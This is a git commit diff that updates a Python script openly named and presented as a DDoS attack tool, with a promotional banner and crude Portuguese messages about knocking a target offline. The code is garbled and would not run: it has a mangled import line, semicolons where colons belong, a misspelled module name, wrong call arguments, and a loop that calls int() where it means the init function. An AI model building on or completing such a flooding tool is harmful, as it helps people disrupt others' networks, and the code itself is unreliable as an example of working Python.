2a6d651fe0fe85ee30063cb013b206cf87b52d0b
BLACKCØDER <69689969+BLCKCODERR@users.noreply.github.com>
2020-10-01 09:23:27 -0300

    Update ddos-attack

--- ddos-attack-unk.py
+++ ddos-attack-unk.py
@@ -1,5 +1,7 @@
 import socket
 import sys
+import osimport socket
+import sys
 import os
 
 main = """
@@ -13,9 +15,34 @@ main = """
 **         
            
   *        
+  telegram: @x1_dev_ch33ch
+  youtube channel: ch33ch
+Powered by: ch33ch/blackcøder/unk ...\n\n"""
 
-powred by: ch33ch/blackcøder/unk ...\n\n"""
+count = 0
 
 def init(ip, port, main);
+    client = socket.socket(socke.AF_INET,  socket.SOCK_STREAM)
+    client.settimeout(0.03)
+    code = client.connect_ex(ip, int(port))
+    if code == 0;
+        print("[>>]derrubando a net do cuzão")
+        print("IP: %s, PORT: %s", ip, port)
+        
+    else:
+        print("Se fodeu a porta esta fexada.\n")
+    if len(sys.argv) < 3;
+        print("\n\n")
+        print("Modo de uso:")
+        print("ex: python DDos-Attack.py 127.0.0.1 80")
+        sys.exit(0)
+    else:
+        ip = sys.argv[1]
+        porta = sys.argv[2]
+        quantia = int(sys.argv[3])
+        while count < quantia:
+            count+=1
+            int(ip, porta, main)
+        print("Ta olhando oque?")
                                                                                          
-                                                                                                         
+                                                                                              
